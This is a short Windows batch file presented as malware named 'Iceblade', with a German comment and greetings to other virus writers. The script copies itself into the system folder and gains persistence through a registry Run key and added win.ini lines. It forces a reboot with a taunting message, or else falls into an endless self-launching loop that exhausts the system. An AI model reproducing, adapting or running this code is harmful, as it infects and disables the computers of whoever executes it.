   @echo off
   :: Iceblade
   :: by Razorblade


   :: Der Untergang beginnt
   date=01.01.2000
   time=12.00

   copy %0 "%systemroot%\venim.bat"

   reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v iCeD /t REG_SZ /d "%systemroot%\venim.bat" /f

   echo [windows] >> "%systemroot%\win.ini"
   echo load=%systemroot%\venim.bat >> "%systemroot%\win.ini"
   echo run=%systemroot%\venim.bat >> "%systemroot%\win.ini"

   if exist "%systemroot%\system32\shutdown.exe" (
       shutdown /r /t 25 /c "Venim Iceblade by Razorblade"
   ) else (
       :fu
       start %0
       goto fu
   )

   :: End
   :: Greetz to: Thanatos, HumanBomb & Phereal
